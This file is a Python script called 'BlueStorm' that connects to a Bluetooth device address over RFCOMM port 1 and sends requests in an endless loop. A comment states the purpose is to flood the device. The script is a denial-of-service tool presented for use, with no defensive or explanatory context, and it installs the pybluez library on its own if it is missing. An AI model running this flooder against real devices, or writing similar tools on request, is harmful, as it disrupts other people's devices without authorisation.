import sys
import subprocess
import getopt

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

try:
    import bluetooth
except ImportError:
    install('pybluez')

text = "\033[93m" + """

    ____  __          _____ __                     
   / __ )/ /_  _____ / ___// /_____  _________ ___ 
  / __  / / / / / _ \\__ \/ __/ __ \/ ___/ __ `__ \
 / /_/ / / /_/ /  __/__/ / /_/ /_/ / /  / / / / / /
/_____/_/\__,_/\___/____/\__/\____/_/  /_/ /_/ /_/ 
                                                   
""" + "\033[0m"
print(text)

def main(argv):
    bd_addr = "00:11:22:33:44:55" # default value for address
    try:
        opts, args = getopt.getopt(argv, "ha:", ["address="])
    except getopt.GetoptError:
        print('script.py -a <address of the device>')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print('script.py -a <address of the device>')
            sys.exit()
        elif opt in ("-a", "--address"):
            bd_addr = arg

    port = 1 # The port to which the request will be sent

    sock=bluetooth.BluetoothSocket(bluetooth.RFCOMM)
    sock.connect((bd_addr, port))

    # Send multiple requests in a loop to flood the device with requests
    while True:
        request = "SEND REQUEST" # The request you want to send
        sock.send(request)

    sock.close()

if __name__ == "__main__":
    main(sys.argv[1:])
